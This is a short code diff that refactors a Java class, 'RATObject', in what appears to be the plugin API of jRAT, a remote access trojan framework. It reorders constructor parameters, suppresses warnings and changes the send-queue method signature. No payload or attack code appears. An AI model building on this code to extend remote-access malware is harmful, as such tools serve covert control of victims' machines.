@@ -3,6 +3,7 @@ package org.jrat.project.api;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
+@SuppressWarnings("unused")
 public final class RATObject {
 
 	private final String ip;
@@ -13,7 +14,7 @@ public final class RATObject {
 	private final DataInputStream in;
 	private final DataOutputStream out;
 	
-	public RATObject(String ip, Connection con, IWriter writer, IReader reader, Queue queue, DataInputStream in, DataOutputStream out) {
+	public RATObject(String ip, Connection con, IWriter writer, IReader reader, DataInputStream in, DataOutputStream out, Queue queue) {
 		this.ip = ip;
 		this.con = con;
 		this.writer = writer;
@@ -65,8 +66,8 @@ public final class RATObject {
 	 * @param packet
 	 */
 	
-	public void addToSendQueue(PacketBuilder packet) {
-		queue.addToSendQueue(packet);
+	public void addToSendQueue(PacketBuilder packet) throws Exception {
+		queue.addToSendQueue(packet, this);
 	}
 	
 	
